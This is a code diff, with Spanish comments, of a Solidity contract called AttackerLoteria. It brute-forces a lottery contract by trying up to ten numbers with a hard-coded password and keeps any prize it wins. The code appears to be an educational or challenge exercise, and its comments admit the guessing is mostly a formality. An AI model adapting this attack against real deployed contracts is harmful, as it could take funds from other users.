@@ -76,25 +76,29 @@ interface ILoteriaConPassword {
 
 contract AttackerLoteria {
     ILoteriaConPassword public loteria;
-    uint8 private constant PASSWORD = 1; // Establece el password correcto aquí.
+    uint8 private constant PASSWORD = 1; // Asegúrate de que este es el password que hace que el hash coincida con FACTOR.
 
-    // Setter para la dirección de LoteriaConPassword
-    function setLoteriaAddress(address _address) public {
-        loteria = ILoteriaConPassword(_address);
+    // Constructor para inicializar la dirección de LoteriaConPassword
+    constructor(address _loteriaAddress) {
+        loteria = ILoteriaConPassword(_loteriaAddress);
     }
 
     function attack() public payable {
         require(msg.value >= 1500, "Insufficient funds for the attack");
 
-        // Intentar ganar la lotería con diferentes números
+        // Asumir que tenemos alguna forma de predecir o ajustar el número ganador, si es posible
+        // Este loop es más una formalidad ya que el número ganador es difícil de predecir sin conocer el estado exacto del bloque
         for (uint256 i = 0; i < 10; i++) {
             try loteria.participarEnLoteria{value: 1500}(PASSWORD, i) {
+                // Si una transacción es exitosa y el contrato gana, rompe el bucle
                 break;
             } catch {
+                // Si la transacción falla, intenta con el siguiente número
                 continue;
             }
         }
     }
 
+    // Función para recibir ether, necesaria para recibir premios de la lotería
     receive() external payable {}
 }
